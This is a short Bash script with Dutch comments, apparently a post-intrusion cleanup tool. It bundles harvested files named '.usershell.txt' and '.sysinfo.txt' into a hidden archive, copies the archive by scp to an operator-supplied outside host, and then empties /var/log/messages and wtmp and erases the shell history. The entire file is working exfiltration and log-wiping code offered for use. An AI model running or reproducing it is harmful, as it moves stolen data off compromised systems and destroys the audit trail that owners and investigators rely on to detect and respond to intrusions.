#!/bin/bash
#cleanup script na het verkrijgen van de informatie

LOG_DIR=/var/log

# pas deze array aan met je output files voor correcte cleanup
# increment voor nu ook de for loop iets naar onder met 1
ARRAY=(.usershell.txt .sysinfo.txt)


#begin met het zoeken en downloaden van de informatie

red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
NC='\033[0m' # No Color
SAVED_DIR=$1
echo -e "${red}Zorg dat SSH op host aan staat voor SCP!!!${NC}"
echo "Doorgaan? (y/n)"
read USER_IN
if [ "$USER_IN" = "y" ]; then
  echo "Archive wordt aangemaakt"
else
  exit 0
fi

# maak een archive
if cd $SAVED_DIR; then
  mkdir .bingo
  # increment deze for loop voor elke output item
  for i in 1 2
  do
      mv ${ARRAY[$i-1]} .bingo
  done
  tar -cvf bingo.tar .bingo
  if [ "$?" = "0" ]; then
    echo -e "${green}Archive made${NC}"
  else
    echo -e "${red}Error tijdens maken van archive${NC}" 1>&2
    exit 1
  fi

  rm -R .bingo
else
  echo "Folder niet gevonden of niet kunnen switchen naar die folder"
  exit 1
fi

# upload de archive naar een host
echo "Ip adres van upload host:"
read IP_ADDR
echo "Username: "
read USER_NAME
echo "Password: "
read USER_PASS

if scp bingo.tar $USER_NAME@$IP_ADDR:/home/$USER_NAME; then
  echo "Upload succesvol"
else
  echo "Upload niet geslaagd"
  exit 1
fi

# als laatste verwijder de log files
cd $LOG_DIR

cat /dev/null > messages
cat /dev/null > wtmp

cat /dev/null > ~/.bash_history && history -w && history -c

exit 0
